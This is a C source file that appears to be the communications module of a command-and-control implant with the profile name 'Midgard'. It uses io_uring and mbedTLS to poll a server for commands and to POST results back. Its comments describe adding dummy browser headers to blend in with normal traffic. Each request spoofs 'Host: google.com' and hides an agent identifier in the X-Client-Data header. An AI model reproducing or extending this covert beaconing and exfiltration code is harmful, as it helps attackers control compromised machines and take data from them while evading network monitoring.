#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <liburing.h>
#include "functions/connection/connection.h"
#include "functions/connection/req_struct.h"
#include "functions/http_parse/http_parse.h"
#include "mbedtls/ctr_drbg.h"
#include "mbedtls/net_sockets.h"
#include "mbedtls/ssl.h"
#include "mbedtls/entropy.h"
#include "mbedtls/error.h"
#include "mbedtls/x509_crt.h"


#define QUEUE_DEPTH 3
#define PROFILE "Midgard"


/*
Explaining mbedTLS integration:

Within connection.c, you will find tls_ring_send and tls_ring_recv function. These are the functions that use io_uring to actually send and recieve the data.

Within the connection() function, you are configuring mbedTLS to use these functions so that when you actually encrypt and send/read data, you use your desired 
form of sockets. So, mbedtls_ssl_write/read is sending your encrypted HTTPS request to the two functions which will then be used to send/recv data. 

Within the overall program there is some overhead with performing multiple SSL connections becasue the current workflow is this:
    1. main() while loop -> connection() initialize rings -> connect to https stream -> send_get() uses rings
    2. send2serv() -> connection() initialize rings -> connect to https stream -> send2serv() uses rings. 
So basically we're initializing rings every X amount of seconds. Twice if a command is sent. Same goes for connecting to the https stream.

*/


int send2serv(request_t *req, const char *uuid, const unsigned char *buf, size_t len) {

    // Add a bunch of dummy headers from google to blend in with normal-ish traffic
    //Only things that matter are the uuid and the content-length. I've tested it and it doens't work without content-length
    connection(req);
    char header_buffer[1024];
    int header_len = snprintf(header_buffer, sizeof(header_buffer),
        "POST /login? HTTP/1.1\r\n"
        "Host: google.com\r\n"
        "Accept-Language: en-US,en;q=0.\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        "Content-Length: %lu\r\n"
        "Sec-Ch-Ua-Mobile: ?0\r\n"
        "X-Client-Data: %s\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Priority: u=0, i\r\n"
        "Connection: keep-alive\r\n\r\n",
        len, uuid);


    size_t total_len = header_len + len;
    unsigned char *full_req = malloc(total_len);

    memcpy(full_req, header_buffer, header_len);
    memcpy(full_req + header_len, buf, len);

    fflush(stdout);

    mbedtls_ssl_write(&req->ssl, (const unsigned char *)full_req, total_len);


    size_t total_read = 0;
    memset(req->buffer, 0, BUFFER_SIZE);

    int ret = mbedtls_ssl_read(&req->ssl, (unsigned char *)req->buffer + total_read, BUFFER_SIZE - 1 - total_read);

    
    if (ret < 0 && ret != MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
        fprintf(stderr, "mbedtls_ssl_read returned -0x%x\n", (unsigned int)-ret);
        return -1;
    }
    free(full_req);
    return len;

}



char *send_get(request_t *req, const char *uuid, char *path, char *hostname) {

    char request_buffer[2048];
    int req_len = snprintf(request_buffer, sizeof(request_buffer),
        "GET /%s HTTP/1.1\r\n"
        "Host: google.com\r\n"
        "Accept-Language: en-US,en;q=0.\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "User-Agent: %s/381.3 /%s/918.4 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        "Sec-Ch-Ua-Mobile: ?0\r\n"
        "X-Client-Data: %s\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Priority: u=0, i\r\n"
        "Connection: keep-alive\r\n\r\n",
        path, PROFILE, hostname, uuid);

    int ret;
    while ((ret = mbedtls_ssl_write(&req->ssl, (const unsigned char *)request_buffer, req_len)) <= 0) {
        if (ret != MBEDTLS_ERR_SSL_WANT_READ && ret != MBEDTLS_ERR_SSL_WANT_WRITE) {
            return NULL;
        }
    }

    size_t total_read = 0;
    memset(req->buffer, 0, BUFFER_SIZE);
    
    // mbedtls handles chunking
    while ((ret = mbedtls_ssl_read(&req->ssl, (unsigned char *)req->buffer + total_read, BUFFER_SIZE - 1 - total_read)) > 0) {
        total_read += ret;
        if (total_read >= BUFFER_SIZE - 1) {
            break; // Buffer is full
        }
    }
    
    if (ret < 0 && ret != MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
        fprintf(stderr, "mbedtls_ssl_read returned -0x%x\n", (unsigned int)-ret);
        return NULL;
    }

    int header_parsed = 0;
    size_t body_offset = 0;
    if (!header_parsed) {
        char *end = header_end(req->buffer);
        if (end) {
            header_parsed = 1;
            body_offset = end - req->buffer + 4;
        }
    }

    char *http_body = req->buffer + body_offset;
    return http_body;

}